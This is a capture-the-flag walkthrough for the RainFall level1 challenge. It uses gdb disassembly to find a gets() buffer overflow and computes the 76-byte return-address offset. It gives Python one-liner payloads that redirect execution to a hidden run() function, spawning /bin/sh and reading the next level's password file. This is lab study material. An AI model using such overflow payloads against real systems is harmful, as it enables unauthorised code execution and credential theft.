# Way to level2

When we enter `level1` shell, we can see `level1` excutable file.
If we launch that file, it takes some input.
Let's give a look with `gdb`

```gdb
(gdb) disassemble main
Dump of assembler code for function main:
   0x08048480 <+0>:     push   %ebp
   0x08048481 <+1>:     mov    %esp,%ebp
   0x08048483 <+3>:     and    $0xfffffff0,%esp
   0x08048486 <+6>:     sub    $0x50,%esp
   0x08048489 <+9>:     lea    0x10(%esp),%eax
   0x0804848d <+13>:    mov    %eax,(%esp)
   0x08048490 <+16>:    call   0x8048340 <gets@plt>
   0x08048495 <+21>:    leave
   0x08048496 <+22>:    ret
```

It seems that we can make a buffer overflow with `gets()` function.
Now, we calculate the offset from the buffer to the saved return address.
`sub $0x50,%esp` reserves 80 bytes, and `lea 0x10(%esp),%eax` places the buffer at `%esp + 0x10`, leaving `0x50 - 0x10 = 64` bytes up to the aligned stack boundary.
For this execution, `and $0xfffffff0,%esp` adds 8 bytes of alignment padding below the saved `%ebp`. The saved `%ebp` itself occupies 4 bytes.
Therefore, the return-address offset is `64 + 8 + 4 = 76` bytes. The next 4 bytes overwrite the saved return address; 76 is the offset, not the buffer size. The 8-byte padding depends on the stack pointer before alignment, rather than being a constant implied by the `and` instruction alone.

Base of this we can make some command to cause a buffer overflow.
```bash
level1@RainFall:~$ python -c 'print "a"*76 + "AAAA"' | ./level1
Segmentation fault (core dumped)
```

So, now we can more discover the `level1` excutable file.
Let's see informations of function.
```gdb
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run
0x08048480  main
0x080484a0  __libc_csu_init
0x08048510  __libc_csu_fini
0x08048512  __i686.get_pc_thunk.bx
0x08048520  __do_global_ctors_aux
0x0804854c  _fini
```
We notice that runs function is not used in main function.
Maybe it never reachable. It's a key to exploit this file.
We are going to exploit with its address.

```bash
level1@RainFall:~$ python -c 'print"a"*76 + "\x44\x84\x04\x08"' | ./level1
Good... Wait what?
Segmentation fault (core dumped)
```
The target address of `run()` is `0x08048444`. On this little-endian system, we encode it as `"\x44\x84\x04\x08"`, placing the bytes `44 84 04 08` at increasing memory addresses.
The bytes remain in the order supplied; the CPU interprets the lowest-addressed byte as the least significant byte when reading the 32-bit address. Supplying `"\x08\x04\x84\x44"` would instead represent `0x44840408`; memory does not automatically reverse the input bytes.

But there's some problem, in this state we can not exploit this level.
So let's give a look for run function.

```gdb
(gdb) disassemble run
Dump of assembler code for function run:
   0x08048444 <+0>:     push   %ebp
   0x08048445 <+1>:     mov    %esp,%ebp
   0x08048447 <+3>:     sub    $0x18,%esp
   0x0804844a <+6>:     mov    0x80497c0,%eax
   0x0804844f <+11>:    mov    %eax,%edx
   0x08048451 <+13>:    mov    $0x8048570,%eax
   0x08048456 <+18>:    mov    %edx,0xc(%esp)
   0x0804845a <+22>:    movl   $0x13,0x8(%esp)
   0x08048462 <+30>:    movl   $0x1,0x4(%esp)
   0x0804846a <+38>:    mov    %eax,(%esp)
   0x0804846d <+41>:    call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:    movl   $0x8048584,(%esp)
   0x08048479 <+53>:    call   0x8048360 <system@plt>
   0x0804847e <+58>:    leave
   0x0804847f <+59>:    ret
End of assembler dump.

```
In `run()`, `fwrite` prints `"Good... Wait what?"` followed by a newline to `stdout`. Input is read by `gets` in `main`, not by `fwrite`.
The instruction `movl $0x8048584,(%esp)` writes a string pointer to the stack as the argument to `system`; it does not change the `%esp` register itself. Let's inspect the string at `0x8048584`.

```gdb
(gdb) x/s 0x8048584
0x8048584:       "/bin/sh"
```
It is `/bin/sh`, so when the program launch, it takes in `/bin/sh` environment.
So we have to keep `sh` environment.
```bash
level1@RainFall:~$ python -c 'print"a"*76 + "\x44\x84\x04\x08"' > /tmp/exploit
level1@RainFall:~$ cat /tmp/exploit - | ./level1
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
REMOVED
Segmentation fault (core dumped)
```
`-` stands for `stdin`. If we not contain this character, the program meet EOF.
